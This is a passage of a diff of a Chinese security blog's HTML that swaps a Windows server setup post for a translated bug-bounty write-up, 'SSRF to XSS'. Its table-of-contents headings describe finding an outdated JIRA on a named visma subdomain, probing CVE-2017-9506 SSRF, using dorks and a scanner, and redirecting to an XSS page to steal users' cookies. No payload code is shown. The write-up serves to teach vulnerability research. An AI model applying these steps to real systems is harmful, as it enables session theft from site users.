安装phpMyAdmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-安装Mysql"><span class="toc-number">5.</span> <span class="toc-text">0x04. 安装Mysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-结语"><span class="toc-number">6.</span> <span class="toc-text">0x05. 结语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"><span class="toc-number">6.0.1.</span> <span class="toc-text">其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities"><span class="toc-number">1.</span> <span class="toc-text">原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">2.</span> <span class="toc-text">难度：低</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"><span class="toc-number">3.</span> <span class="toc-text">  我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"><span class="toc-number">4.</span> <span class="toc-text">如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞"><span class="toc-number">5.</span> <span class="toc-text">  我注意到域名https://customer-incident.consulting.visma.com 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions < 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"><span class="toc-number">6.</span> <span class="toc-text">  我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie"><span class="toc-number">7.</span> <span class="toc-text">  另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https://customer-incident.consulting.visma.com 网站的用户cookie，而不是百度的cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"><span class="toc-number">8.</span> <span class="toc-text">  现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
         
     </div>
     <style>
@@ -481,7 +399,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第五篇翻译：SSRF to XSS　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -538,15 +456,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/" title="上一篇: 漫谈攻击链--从webshell到域控的奇妙之旅">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/04/20/Windows密码抓取总结/" title="下一篇: Windows密码抓取总结">
+            <a href="/2018/12/21/第四篇翻译：XSS漏洞/" title="下一篇: 第四篇翻译：XSS漏洞">
                 <i class="fa fa-angle-right"></i>
             </a>
         
